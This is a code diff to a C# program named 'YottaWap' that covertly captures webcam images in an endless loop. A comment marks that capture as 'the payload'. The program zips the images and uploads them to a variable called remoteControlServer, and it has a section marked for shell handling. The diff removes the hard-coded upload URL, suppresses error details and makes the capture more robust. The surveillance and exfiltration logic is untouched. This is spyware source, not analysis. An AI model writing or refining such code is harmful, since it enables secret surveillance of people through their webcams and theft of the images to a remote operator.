@@ -3,7 +3,9 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.Http;
 using System.Text;
+using System.Threading.Tasks;
 using System.Windows;
 using Emgu.CV;
 using Ionic.Zip;
@@ -21,7 +23,7 @@ namespace YottaWap
             ExecuteCode();
         }
 
-        string remoteControlServer = "https://www.wesdb.com/upload.php";
+        string remoteControlServer = "";
 
         public enum ErrorCodes
         {
@@ -79,22 +81,37 @@ namespace YottaWap
             return cap;
         }
 
-        void WriteError(string mainPath, Exception ex)
+        void WriteError(string mainPath, string msg)
         {
-            string dataToAppend = "[ " + DateTime.Now.ToString() + " ], " + ex.ToString() + "\n";
-            File.AppendAllText(mainPath + "Logs/Errors.txt", dataToAppend);
+            try
+            {
+                string dataToAppend = "[ " + DateTime.Now.ToString() + " ]\n";
+                File.AppendAllText(mainPath + "Logs/Errors.txt", dataToAppend);
+            }
+            catch (Exception ex2)
+            {
+                Console.WriteLine(ex2.Message);
+            }
         }
         void WriteLog(string mainPath, string msg)
         {
-            string dataToAppend = "[ " + DateTime.Now.ToString() + " ], " + msg + "\n";
-            File.AppendAllText(mainPath + "Logs/Logs.txt", dataToAppend);
+            try
+            {
+                string dataToAppend = "[ " + DateTime.Now.ToString() + " ], " + msg + "\n";
+                File.AppendAllText(mainPath + "Logs/Logs.txt", dataToAppend);
+            }
+            catch (Exception)
+            {
+                Console.WriteLine(msg);
+            }
         }
 
-        int EnterLoop(string mainPath, VideoCapture cap)
+
+        int EnterLoop(string mainPath)
         {
             int i = 0;
             string sessionPrefix = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
-            int uploadEvery = 40;
+            int uploadEvery = 50;
             while (true)
             {
                 try
@@ -102,11 +119,20 @@ namespace YottaWap
                     // This is the payload \\
 
                     // Capture Image
-                    cap = new VideoCapture(0);
+                    VideoCapture cap = new VideoCapture(0);
                     Mat image = new Mat();
-                    cap.Read(image);
+
+                    
+                    if (cap.IsOpened)
+                    {
+                        image = cap.QueryFrame();
+                        if (!image.IsEmpty)
+                        {
+                            image.Save(mainPath + "Data/Captures/capture-" + i.ToString() + "-" + sessionPrefix + ".jpg");
+                        }
+                    }
+                    image.Dispose();
                     cap.Dispose();
-                    image.Save(mainPath + "Data/Captures/capture-" + i.ToString() + "-" + sessionPrefix + ".jpg");
 
                     //Handel Shell
 
@@ -138,24 +164,23 @@ namespace YottaWap
 
                         File.WriteAllLines(mainPath + "FileOutput.txt", filesToUpload.ToArray());
 
-                        using (ZipFile zip = new ZipFile())
-                        {
-                            zip.AddFiles(filesToUpload ,"/");
-                            zip.Save(mainPath + "CapturesToUpload.zip");
-                        }
+                        ZipFile zip = new ZipFile();
+                        zip.AddFiles(filesToUpload ,"/");
+                        zip.Save(mainPath + "CapturesToUpload.zip");
+                        zip.Dispose();
+                        
 
                         WebClient Client = new WebClient();
 
                         Client.Headers.Add("Content-Type", "binary/octet-stream");
-                        byte[] result = Client.UploadFile(remoteControlServer, mainPath + "CapturesToUpload.zip");
-
-                        string s = Encoding.UTF8.GetString(result, 0, result.Length);
-                        WriteLog(mainPath, s);
+                        Client.UploadFile(remoteControlServer, mainPath + "CapturesToUpload.zip");
+                        Client.Dispose();
+                        WriteLog(mainPath, "Ok.");
                     }
                 }
                 catch (Exception ex)
                 {
-                    WriteError(mainPath, ex);
+                    WriteError(mainPath, ex.Message);
                     i++;
                 }
             }
@@ -168,7 +193,7 @@ namespace YottaWap
                 ExitWithError(dirMadeSuccess);
             }
 
-            EnterLoop(Directory.GetCurrentDirectory() + "\\YottaWap\\", null);
+            EnterLoop(Directory.GetCurrentDirectory() + "\\YottaWap\\");
 
         }
     }
